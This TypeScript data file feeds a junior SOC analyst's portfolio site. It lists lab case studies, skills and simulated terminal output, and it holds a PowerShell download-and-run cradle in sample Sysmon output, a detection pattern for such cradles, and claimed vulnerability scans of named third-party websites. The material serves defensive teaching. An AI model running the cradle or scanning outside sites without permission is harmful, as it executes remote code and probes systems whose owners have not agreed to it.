import { CaseStudy, SecuritySkillCategory, TerminalCommand } from '../types/portfolio';

export const PERSONAL_INFO = {
  name: 'Hritesh Kumar Nayak',
  shortName: 'Hritesh Kumar',
  role: 'Junior SOC Analyst | Cybersecurity Fresher',
  targetRoleBadge: 'Currently Looking for Junior SOC Analyst Roles',
  tagline: 'SIEM Log Analysis · Threat Detection & Response · Wireshark & Nmap · Vulnerability Assessment',
  email: 'hriteshk.nayak@gmail.com',
  phone: '+91 7008405048',
  location: 'Berhampur, Ganjam, Odisha, India',
  education: {
    institution: 'Roland Institute of Technology',
    period: '2022–2026',
    degree: 'Bachelor of Technology (B.Tech), Computer Science and Engineering',
    coursework: [
      'Database Management Systems',
      'Computer Science',
      'Business Software Development'
    ]
  },
  careerInterests: [
    'Security Operations Center (SOC)',
    'SIEM Monitoring',
    'Security Alert Investigation',
    'Threat Detection',
    'Incident Response',
    'Vulnerability Management'
  ],
  summary:
    'Entry-level Cybersecurity Professional with a B.Tech in Computer Science and Engineering and a strong foundation in networking, Linux, network security and vulnerability assessment. Familiar with Wireshark, Nmap, Kali Linux and Burp Suite, with practical exposure to security testing in lab environments. Interested in SIEM monitoring, log analysis, threat detection and incident response. Seeking a Junior SOC Analyst opportunity to apply analytical and technical skills while developing practical security operations experience.',
  resumePdfUrl: '/assets/aistudio/Hritesh_Kumar_Nayak_SOC_Analyst_CV_v2_62f4c324.pdf',
  portfolioPdfUrl: '/assets/aistudio/Adobe_Portfolio_73d22983.pdf',
  linkedinUrl: 'https://www.linkedin.com/in/hritesh-kumar-04b9b2329/',
  portraitUrl: '/assets/aistudio/hritesh_portrait.jpg',
  heroBannerUrl: '/assets/aistudio/2026_3eb06b7f.png'
};

export const CASE_STUDIES: CaseStudy[] = [
  {
    id: 'splunk-siem-homelab',
    toolName: 'Splunk Enterprise SIEM',
    badge: 'Project 1 · Most Important',
    title: 'Splunk SIEM Home Lab: Windows Security Log Monitoring & Detection',
    operation: 'Windows Event Log Ingestion · Failed Login Triage · Real-Time Security Dashboard',
    purpose:
      'Engineered an enterprise-grade Splunk SIEM home lab collecting Windows security telemetry to search failed login spikes, investigate suspicious authentication patterns, and construct real-time SOC monitoring dashboards.',
    imageSrc: '/assets/projects/splunk_homelab.jpg',
    deliverable: 'GitHub documentation and screenshots',
    referenceDomain: 'blog.slytech.us',
    isPrimary: true,
    keyFindings: [
      'Collect Windows security logs via Splunk Universal Forwarder across domain endpoints',
      'Search failed login attempts (Event ID 4625) and correlate with successful authentications (Event ID 4624)',
      'Investigate suspicious authentication patterns, brute-force anomalies, and off-hours credential access',
      'Create a simple security dashboard with real-time alerting rules and metric visualizers'
    ],
    technicalDetails: {
      targetTested: 'Windows Active Directory / Domain Controller & Endpoints',
      endpointsCrawled: 'Security Event IDs 4624 (Logon), 4625 (Failed Logon), Sysmon Event 1',
      threatLevel: 'High Severity / T1110 Brute Force & Credential Access Triage',
      standards: ['MITRE ATT&CK T1110 (Brute Force)', 'NIST SP 800-61 Rev 2', 'CIS Controls v8']
    },
    remediationSnippet:
      '// Splunk SPL Correlation Search: index=win_sec EventID=4625 | bin span=5m _time | stats count AS failures by Source_Network_Address, User | where failures > 15 | sort -failures. Automated action: Account lockout & host isolation.',
    tags: ['Splunk SIEM', 'Home Lab', 'Windows Security', 'Event 4625', 'Dashboards']
  },
  {
    id: 'network-traffic-investigation',
    toolName: 'Wireshark Network Analyzer',
    badge: 'Project 2 · Network Traffic',
    title: 'Network Traffic Investigation & Protocol Packet Analysis',
    operation: 'Packet Capture (.pcap) · DNS & HTTP/HTTPS Inspection · Anomaly Triage',
    purpose:
      'Conducted deep packet inspection on live network traffic captures to dissect DNS queries, analyze plaintext HTTP and encrypted HTTPS/TLS transactions, and identify unusual or malicious connection attempts.',
    imageSrc: '/assets/projects/wireshark_traffic.jpg',
    deliverable: 'Network investigation report',
    referenceDomain: 'techtarget.com',
    keyFindings: [
      'Capture network traffic using Wireshark across active network interfaces (.pcapng)',
      'Examine DNS and HTTP/HTTPS traffic flows to detect suspicious hostnames and abnormal user-agents',
      'Identify unusual connections, high-entropy beaconing patterns, and unencrypted credential leaks',
      'Document your findings with packet timeline logs, protocol hierarchies, and forensic indicators'
    ],
    technicalDetails: {
      targetTested: 'Local Area Network & Segmented Lab Subnets (192.168.0.0/24)',
      endpointsCrawled: 'DNS Port 53, HTTP Port 80, TLS/HTTPS Port 443, TCP/UDP Streams',
      threatLevel: 'Medium to High / Potential C2 Beaconing & Protocol Tunneling',
      standards: ['RFC 1035 (DNS)', 'RFC 7230 (HTTP/1.1)', 'MITRE ATT&CK T1071 (App Protocol)']
    },
    remediationSnippet:
      '// Wireshark Filter: dns.flags.response == 0 and dns.qry.name matches ".*\\.ru$". Action: Flag host 192.168.0.42 for containment, sinkhole destination domain in internal DNS, and apply firewall egress block.',
    tags: ['Wireshark', 'Packet Analysis', 'DNS Inspection', 'HTTP/HTTPS', 'Network Forensics']
  },
  {
    id: 'wazuh-security-monitoring',
    toolName: 'Wazuh SIEM & XDR Manager',
    badge: 'Project 3 · Endpoint XDR',
    title: 'Wazuh Security Monitoring & SOC Incident Investigation',
    operation: 'Lab Deployment · Endpoint Event Telemetry · Alert Triage & Response',
    purpose:
      'Deployed Wazuh SIEM/XDR manager in a lab environment to monitor multi-platform endpoint events, ingest agent logs, investigate high-severity security alerts, and execute SOC incident response workflows.',
    imageSrc: '/assets/projects/wazuh_monitoring.jpg',
    deliverable: 'SOC incident investigation report',
    referenceDomain: 'linkedin.com',
    keyFindings: [
      'Install Wazuh in a lab environment (Wazuh Indexer, Server, and Dashboard)',
      'Monitor endpoint security events across Windows and Linux agents in real time',
      'Investigate alerts mapped against MITRE ATT&CK tactics, techniques, and procedures',
      'Document detection and response steps through structured SOC ticketing and remediation plans'
    ],
    technicalDetails: {
      targetTested: 'Wazuh Lab Environment with Windows 10 & Ubuntu 22.04 LTS Agents',
      endpointsCrawled: 'Syscheck (FIM), Rootcheck, SCA (Security Configuration), Sysmon Logs',
      threatLevel: 'Critical & High / Privilege Escalation & Lateral Movement Blocked',
      standards: ['MITRE ATT&CK for Enterprise', 'NIST SP 800-61 Incident Handling', 'CIS Benchmarks']
    },
    remediationSnippet:
      '// Wazuh Active Response: Automated script triggered upon rule 5710 (sshd brute force): iptables rule injected to drop source IP for 600s; notification dispatched to SOC analyst on-call.',
    tags: ['Wazuh SIEM', 'Endpoint Monitoring', 'Incident Response', 'MITRE ATT&CK', 'XDR']
  },
  {
    id: 'phishing-investigation',
    toolName: 'Phishing & Threat Intel Triage',
    badge: 'Email Analysis & IOC Extraction',
    title: 'Malicious Email Triage & Threat Intelligence Pipeline',
    operation: 'Email Header Inspection (.eml) · SPF/DKIM/DMARC Analysis · IOC Defanging',
    purpose:
      'Conducted end-to-end investigation of suspicious phishing artifacts, analyzing authentication headers, identifying spoofed domains, and correlating extracted Indicators of Compromise (IOCs) against open-source threat intelligence feeds.',
    imageSrc: '/assets/aistudio/acunetix_app.jpg',
    keyFindings: [
      'Analyzed raw RFC 822 email headers uncovering SPF=fail and DKIM=neutral indicating forged sender identities',
      'Extracted obfuscated phishing URLs hidden behind URL shorteners; defanged and submitted to VirusTotal and URLScan.io',
      'Calculated SHA-256 hashes of malicious document attachments with embedded VBA macros targeting user credentials',
      'Formulated actionable security awareness recommendations and firewall block rules for flagged adversary IP ranges'
    ],
    technicalDetails: {
      targetTested: 'Suspicious Invoice .eml samples & Macro Payloads',
      threatLevel: 'High Risk / Credential Harvesting Campaign',
      standards: ['MITRE T1566: Phishing', 'RFC 7208 (SPF)', 'RFC 6376 (DKIM)']
    },
    remediationSnippet:
      '// SOC Playbook Action: Enforced DMARC policy from "none" to "reject", pushed malicious sender domains to gateway tenant blocklists, and purged 14 delivery instances from user mailboxes via PowerShell Graph API.',
    tags: ['Phishing Triage', 'Email Headers', 'Threat Intel', 'IOC Extraction', 'VirusTotal']
  },
  {
    id: 'owasp-zap',
    toolName: 'OWASP ZAP 2.13.0',
    badge: 'Dynamic Web Surface Monitoring',
    title: 'Deep Endpoint Discovery via AJAX Spidering',
    operation: 'AJAX Spider · Dynamic Endpoint & Content Discovery',
    purpose:
      'Acts as an intercepting proxy between tester and target web application, capturing HTTP/S traffic, crawling client-rendered single-page applications, inspecting raw request/response headers, and identifying attack surfaces.',
    imageSrc: '/assets/aistudio/owasp_zap_app.jpg',
    keyFindings: [
      'Successfully mapped 119+ crawled dynamic URLs using Firefox Headless AJAX spider',
      'Captured and analyzed asynchronous API routes hidden from traditional static scrapers',
      'Inspected 403 Forbidden response headers on restricted content pipelines',
      'Mapped out-of-scope CDN endpoints to prevent unintended scanning on third parties'
    ],
    technicalDetails: {
      targetTested: 'https://www.canopycare.us/ (Standard Mode)',
      endpointsCrawled: '119 dynamic endpoints discovered',
      threatLevel: 'Informational to High Attack Surface Mapping',
      standards: ['OWASP Top 10:2021', 'A05: Security Misconfiguration', 'PTES Phase 2: Reconnaissance']
    },
    remediationSnippet:
      '// Remediation Guidance: Implement strict origin whitelisting on internal API proxies and disable verbose HTTP header responses (e.g. Server banner and internal routing paths). Enforce explicit authentication checks before serving cached asset streams.',
    tags: ['OWASP ZAP', 'AJAX Spider', 'Proxy Interception', 'API Recon', 'PTES']
  },
  {
    id: 'burp-suite',
    toolName: 'Burp Suite Professional',
    badge: 'Automated Scanning & Traffic Tampering',
    title: 'Automated Vulnerability Scanning & HTTP Traffic Analysis',
    operation: 'Automated Vulnerability Scanning & Deep HTTP Traffic Analysis',
    purpose:
      'Industry-standard intercepting proxy utilized for traffic manipulation, deep packet analysis, and automated scanning of client-server application logic.',
    imageSrc: '/assets/aistudio/burp_suite_app.jpg',
    keyFindings: [
      'Flagged Cross-Origin Resource Sharing (CORS) flaw: Arbitrary origin trusted [9 instances]',
      'Discovered Reflected Cross-Site Scripting (XSS) vectors across vulnerable query parameters [10 instances]',
      'Identified insecure form design: Password field with autocomplete enabled in browser storage',
      'Reported missing Strict-Transport-Security (HSTS) headers and Open Redirection (DOM-based) [13 instances]'
    ],
    technicalDetails: {
      targetTested: 'quantumx.com.sg & Monorail Production API Endpoints',
      threatLevel: 'High Severity / Multiple Exploitation Vectors Identified',
      standards: ['OWASP A01: Broken Access Control', 'OWASP A03: Injection', 'OWASP A07: Identification Failures']
    },
    remediationSnippet:
      '// Remediation Guidance: Restrict CORS "Access-Control-Allow-Origin" headers to explicit trusted domains instead of echoing the Request Origin. Sanitize all user-controlled inputs using context-aware HTML encoding and set "autocomplete=\'off\'" on sensitive credential fields.',
    tags: ['Burp Suite Pro', 'CORS Misconfiguration', 'XSS Discovery', 'Repeater / Intruder', 'OWASP Top 10']
  },
  {
    id: 'acunetix',
    toolName: 'Acunetix by Invicti',
    badge: 'Risk Assessment & Compliance Verification',
    title: 'Automated Vulnerability Scan & Threat Level 3 Proof-of-Exploit',
    operation: 'Risk Rating Generation, Proof-of-Exploit (PoE), & Compliance Reporting',
    purpose:
      'Comprehensive vulnerability scanner generating executive risk ratings, technical exploit verifications, and prioritized developer remediation blueprints.',
    imageSrc: '/assets/aistudio/acunetix_app.jpg',
    keyFindings: [
      'Triggered Acunetix Threat Level 3 (HIGH) alert rating with active exploit verification',
      'Demonstrated high-severity vector allowing malicious actors to compromise backend database or deface client portals',
      'Mapped full redirect chains (share.hsforms.com -> hubspot.com product flows)',
      'Produced detailed developer-ready remediation tickets with step-by-step reproduction scripts'
    ],
    technicalDetails: {
      targetTested: 'share.hsforms.com (Full Scan v15.3)',
      threatLevel: 'Threat Level 3 (HIGH) · Severe Impact Risk',
      standards: ['CVSS v3.1 Score: 8.5+ (High)', 'NIST SP 800-115', 'OWASP A03: Injection']
    },
    remediationSnippet:
      '// Remediation Guidance: Deploy parameterized queries (Prepared Statements) across all backend persistence layers to prevent SQLi. Implement Web Application Firewall (WAF) rule sets to filter serialized exploit signatures before reaching application processes.',
    tags: ['Acunetix', 'Threat Level 3', 'Database Compromise PoC', 'Executive Reporting', 'Compliance']
  },
  {
    id: 'lab-assessment',
    toolName: 'Purple Team Security Lab (DVWA & Juice Shop)',
    badge: 'Attack Simulation & Detection Validation',
    title: 'Web Application Vulnerability & Detection Lab',
    operation: 'Exploitation Simulation & Defense Triage',
    purpose:
      'Architected and maintained a local security testing lab to simulate real-world attack vectors and observe corresponding log signatures in SIEM dashboards.',
    imageSrc: '/assets/aistudio/owasp_zap_app.jpg',
    keyFindings: [
      'Executed SQL Injection (SQLi) authentication bypass and logged the raw database query anomaly',
      'Demonstrated Stored and Reflected Cross-Site Scripting (XSS) payload execution leading to session hijacking',
      'Tested Broken Authentication mechanisms by cracking weak session tokens and credential spraying',
      'Compiled comprehensive penetration test & SOC detection reports featuring CVSS v3 scoring and MITRE mappings'
    ],
    technicalDetails: {
      targetTested: 'DVWA (Damn Vulnerable Web App) & OWASP Juice Shop',
      threatLevel: 'Critical & High Exploits Documented',
      standards: ['OWASP Top 10:2021', 'PTES Framework', 'CVSS v3.1 Scoring']
    },
    remediationSnippet:
      '// Purple Team Takeaway: Correlating offensive attack techniques with blue-team defensive log ingestion provides unmatched insight when writing correlation rules and investigating live alerts.',
    tags: ['Purple Team', 'DVWA', 'OWASP Juice Shop', 'SQLi', 'Detection Triage']
  }
];

export const SKILL_CATEGORIES: SecuritySkillCategory[] = [
  {
    title: 'SOC Operations & Incident Response',
    description: 'Methodical alert triage, log aggregation, threat investigation, and containment.',
    skills: [
      { name: 'SIEM Log Monitoring & Analysis', proficiency: 'Advanced', detail: 'Hands-on query writing and dashboard creation in Splunk and Wazuh.' },
      { name: 'Incident Response Lifecycle', proficiency: 'Advanced', detail: 'Executing NIST SP 800-61 / SANS PICERL phases (Detection to Lessons Learned).' },
      { name: 'Alert Triage & Investigation', proficiency: 'Advanced', detail: 'Distinguishing True Positives from False Positives; context gathering across hosts.' },
      { name: 'Endpoint Telemetry & Sysmon', proficiency: 'Advanced', detail: 'Deep analysis of Windows Event Logs (4624, 4625, 4688) and Sysmon telemetry.' },
      { name: 'Network Packet Analysis', proficiency: 'Core', detail: 'Wireshark packet sniffing, TCP handshake analysis, DNS queries, and Zeek logs.' },
      { name: 'Phishing Email Triage', proficiency: 'Advanced', detail: 'RFC header parsing (SPF/DKIM/DMARC), URL defanging, and attachment hash checks.' }
    ]
  },
  {
    title: 'Threat Frameworks & Intelligence',
    description: 'Mapping adversary tactics, techniques, and procedures (TTPs) to global threat intelligence standards.',
    skills: [
      { name: 'MITRE ATT&CK Framework', proficiency: 'Advanced', detail: 'Mapping alerts to Enterprise tactics (Initial Access, Execution, Persistence, Defense Evasion).' },
      { name: 'Cyber Kill Chain', proficiency: 'Advanced', detail: 'Tracking adversary movement from Reconnaissance to Actions on Objectives.' },
      { name: 'Threat Intelligence Feeds', proficiency: 'Core', detail: 'OSINT correlation using VirusTotal, AbuseIPDB, AlienVault OTX, and URLScan.io.' },
      { name: 'Detection Engineering (Sigma / YARA)', proficiency: 'Practitioner', detail: 'Writing detection rules for anomalous process execution and malicious file signatures.' }
    ]
  },
  {
    title: 'Offensive Security Insight (Purple Team Edge)',
    description: 'Knowing how adversaries exploit targets to build sharper, more resilient detection rules.',
    skills: [
      { name: 'Burp Suite Professional', proficiency: 'Advanced', detail: 'HTTP traffic analysis, proxy tampering, and web vulnerability verification.' },
      { name: 'OWASP ZAP', proficiency: 'Advanced', detail: 'AJAX spidering, dynamic API endpoint discovery, and passive scanner analysis.' },
      { name: 'Acunetix by Invicti', proficiency: 'Advanced', detail: 'Automated vulnerability scanning, risk ratings, and proof-of-exploit auditing.' },
      { name: 'Nmap & Network Enumeration', proficiency: 'Advanced', detail: 'Port scanning, service discovery, firewall probing, and SYN/TCP sweeps.' },
      { name: 'Metasploit & Exploit Testing', proficiency: 'Core', detail: 'Payload generation, auxiliary scanner modules, and exploitation validation in lab.' },
      { name: 'Web Exploitation (SQLi, XSS, Auth)', proficiency: 'Advanced', detail: 'Deep understanding of OWASP Top 10 vulnerabilities and attack payloads.' }
    ]
  },
  {
    title: 'Systems, Languages & Scripting',
    description: 'Operating environments, scripting automation, and database administration.',
    skills: [
      { name: 'Operating Systems', proficiency: 'Advanced', detail: 'Kali Linux, Ubuntu Server, Parrot Security OS, Windows Server / Active Directory.' },
      { name: 'Python & Script Automation', proficiency: 'Core', detail: 'Writing Python scripts for log parsing, API-based IOC lookups, and regex filtering.' },
      { name: 'Bash & PowerShell', proficiency: 'Core', detail: 'Command-line forensics, event log extraction, and automated task scripting.' },
      { name: 'SQL & Database Systems', proficiency: 'Core', detail: 'Writing SQL queries, database schema auditing, and SQL injection analysis.' }
    ]
  }
];

export const TERMINAL_COMMANDS: TerminalCommand[] = [
  {
    cmd: 'index=windows_security sourcetype="WinEventLog:Security" EventCode=4625 | stats count by src_ip, user | where count > 10',
    label: 'Splunk: Detect Brute Force (Event 4625)',
    category: 'siem',
    mitreRef: 'MITRE ATT&CK T1110.001 (Password Guessing)',
    description: 'Splunk SPL query correlating multiple failed logon events from identical IP addresses within a tight time window.',
    output: [
      '[+] Executing Splunk Search Processing Language (SPL) search across index=windows_security...',
      '[!] Threshold breached: 47 failed logons (Event ID 4625) recorded for user "svc_admin" from src_ip="192.168.1.145"',
      '[!] Followed by Event ID 4624 (Successful Logon) from identical src_ip 3 minutes later',
      '[!] Incident Verdict: TRUE POSITIVE · High Confidence Password Guessing Attack',
      '[✓] Triggered PagerDuty priority alert & generated SOC incident ticket #SEC-8921'
    ],
    remediation: 'Immediately isolate host 192.168.1.145 via EDR network containment, disable compromised account "svc_admin", and reset credentials across domain.'
  },
  {
    cmd: 'sysmon -s | grep -E "Image.*powershell.exe.*-enc|downloadstring"',
    label: 'Sysmon: Process Creation Triage (Event 1)',
    category: 'sysmon',
    mitreRef: 'MITRE ATT&CK T1059.001 (PowerShell Execution)',
    description: 'Inspect Sysmon Event ID 1 telemetry for anomalous PowerShell execution with Base64 encoded payloads or web download cradles.',
    output: [
      'EventID: 1 (Process Create) | UtcTime: 2026-11-05 03:12:44.112',
      'ProcessGuid: {a2b4-7c91-44ef-bc12-990812739182}',
      'Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      'CommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQALgAuAC4A',
      'ParentImage: C:\\Windows\\explorer.exe | ParentCommandLine: "explorer.exe"',
      'User: DOMAIN\\john.doe | CurrentDirectory: C:\\Users\\john.doe\\Downloads',
      '[!] Decoded Base64: IEX (New-Object Net.WebClient).DownloadString("http://198.51.100.42/payload.ps1")',
      '[!] Verdict: High-Severity Malicious Dropper Execution'
    ],
    remediation: 'Terminate process tree PID 4812, inspect proxy logs for outbound requests to 198.51.100.42, and pull host memory dump for forensic analysis.'
  },
  {
    cmd: 'tshark -r incident_capture.pcap -Y "dns.flags.response == 0 and dns.qry.name matches \'.*\\\\.ru$\'" -T fields -e ip.src -e dns.qry.name',
    label: 'Wireshark: DNS Anomaly & C2 Beaconing',
    category: 'network',
    mitreRef: 'MITRE ATT&CK T1071.004 (DNS Communication)',
    description: 'Command-line packet inspection filtering suspicious DNS request queries for high-entropy domains and C2 beaconing patterns.',
    output: [
      'Reading from incident_capture.pcap [Total Packets: 184,209]...',
      '10.0.4.52    a7f89b1c2d3e.beacon.threat-domain.ru',
      '10.0.4.52    b901cd4ef5a6.beacon.threat-domain.ru',
      '10.0.4.52    c123de4fa7b8.beacon.threat-domain.ru',
      '[!] High-Entropy Subdomain Pattern: Potential DNS Tunneling / Exfiltration',
      '[!] Regular beacon interval detected: 60s jittered heartbeat',
      '[✓] Extracted 3 IP destinations and flagged internal host 10.0.4.52 for quarantine'
    ],
    remediation: 'Block query domain "threat-domain.ru" in DNS sinkhole/umbrella, null-route external C2 IPs, and inspect workstation 10.0.4.52.'
  },
  {
    cmd: 'python3 eml_parser.py --file suspicious_invoice.eml --ioc-out ioc_list.json',
    label: 'Phishing: RFC 822 Header & IOC Parser',
    category: 'phishing',
    mitreRef: 'MITRE ATT&CK T1566.001 (Spearphishing Attachment)',
    description: 'Automated script extracting email authentication status, originating IP hops, defanged URLs, and SHA256 attachment hashes.',
    output: [
      '[*] Analyzing RFC 822 MIME structure: suspicious_invoice.eml',
      '[*] From: "Billing Office" <billing@legit-accounting-firm.com>',
      '[*] Return-Path: <attacker@spoofed-mailer.xyz>',
      '[!] SPF Check: FAIL (ip4: 203.0.113.19 is not authorized for legit-accounting-firm.com)',
      '[!] DKIM Check: NONE | DMARC Check: FAIL',
      '[*] Extracted Attachment: Invoice_98124.doc.zip (Size: 42 KB)',
      '[*] SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      '[!] Threat Intel Lookup: Flagged by 48/72 engines on VirusTotal as Trojan.Dropper'
    ],
    remediation: 'Broadcast tenant-wide email purge, add attachment hash to EDR blocklist, and notify targeted users regarding phishing simulation.'
  },
  {
    cmd: 'zap-cli quick-run -s xss,sqli --spider --ajax https://target-app.local',
    label: 'ZAP AJAX Spider: Web Attack Surface',
    category: 'recon',
    mitreRef: 'MITRE ATT&CK T1595 (Active Scanning)',
    description: 'Execute headless AJAX spider to map dynamic SPA endpoints and discover unmonitored HTTP routes.',
    output: [
      '[+] Initializing Firefox Headless browser session...',
      '[+] Crawling dynamic DOM state on https://target-app.local',
      '[+] Discovered 119 endpoints via client-side JavaScript routers',
      '[+] Intercepting async POST: /api/v1/auth/session_verify [Status 200 OK]',
      '[!] Alert identified: Missing Strict-Transport-Security header',
      '[✓] Spider completed in 24.3s. Target attack surface mapped.'
    ],
    remediation: 'Ensure newly discovered endpoints are registered with the Web Application Firewall (WAF) and central SIEM logging pipeline.'
  }
];
